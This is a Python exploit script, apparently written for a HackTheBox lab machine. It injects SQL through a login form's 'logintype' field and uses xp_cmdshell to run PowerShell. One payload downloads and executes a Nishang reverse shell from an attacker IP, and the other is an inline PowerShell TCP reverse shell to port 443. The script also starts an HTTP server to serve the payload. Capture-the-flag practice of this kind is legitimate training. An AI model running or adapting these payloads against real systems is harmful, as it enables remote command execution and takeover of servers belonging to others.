import requests, http.server, socketserver, threading, time
from urllib.parse import quote_plus

url = "http://members.streetfighterclub.htb/old/verify.asp"

# download & access payload from nishang + escaping 
payload1 = ";EXEC Xp_CmDsHeLl 'C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe \"IEX(New-Object Net.Webclient).downloadString(\\\"http://10.10.14.9/rev.ps1\\\")\"'"

# using payload from revshells.com ( nc stuck :/ )
payload2 = ";EXEC Xp_CmDsHeLl 'C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe \"$TCPClient = New-Object Net.Sockets.TCPClient(\\\"10.10.14.9\\\", 443); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\\\"$Output`n\\\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()\"'"

http_proxy = {'http':'http://127.0.0.1:8080'}

def send_shell(payload):
    payload = quote_plus(payload)
    data = f"username=admin&password=admin&logintype=1{payload}&rememberme=ON&B1=LogIn"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    print("[i] Check your nc, should be work")
    r = requests.post(url=url, data=data, headers=header, proxies=http_proxy, allow_redirects=False)
    if r.status_code == 302:
        print("[+] Payload successfully injected")
    elif r.status_code == 500:
        print("[-] Something wrong with the payload")

def start_http_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 80), Handler) as httpd:
        print("Serving at port 80")
        httpd.serve_forever()

def main():
    print("[!] Make sure you already turn on nc with listening to 443 and have file Reverse Shell from nishang")
    thread_server = threading.Thread(target=start_http_server)
    thread_server.start()
    time.sleep(5)
    send_shell(payload1)

if __name__ == "__main__":
    main()